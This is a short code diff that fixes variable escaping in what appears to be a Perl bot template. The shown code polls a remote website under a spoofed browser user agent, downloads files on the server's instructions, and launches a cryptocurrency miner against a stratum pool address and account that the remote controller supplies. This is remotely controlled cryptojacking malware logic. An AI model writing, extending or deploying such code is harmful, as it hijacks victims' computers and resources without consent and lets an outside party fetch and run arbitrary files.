@@ -61,9 +61,9 @@ while(1){
 		\$test = 0;
 	  }
 	}
-	system("move $command ../");
+	system("move \$command ../");
   }
-  if(-e "../$command"){
+  if(-e "../\$command"){
     my \$lwp = LWP::UserAgent->new; \$lwp->agent("Mozilla/5.0");
     while(1){
       my \$response = \$lwp->get("$website");
@@ -82,7 +82,7 @@ while(1){
 	      getstore("\$1", "\$2");
 	    }
 	    if(\$_ =~ /miner->host:(.*?);email:(.*?);/){
-	      system("cd ../ && $command -o stratum+tcp://\$1 -u \$2 -p x");
+	      system("cd ../ && \$command -o stratum+tcp://\$1 -u \$2 -p x");
 		}
 	  }
 	  close(RESPONSE);
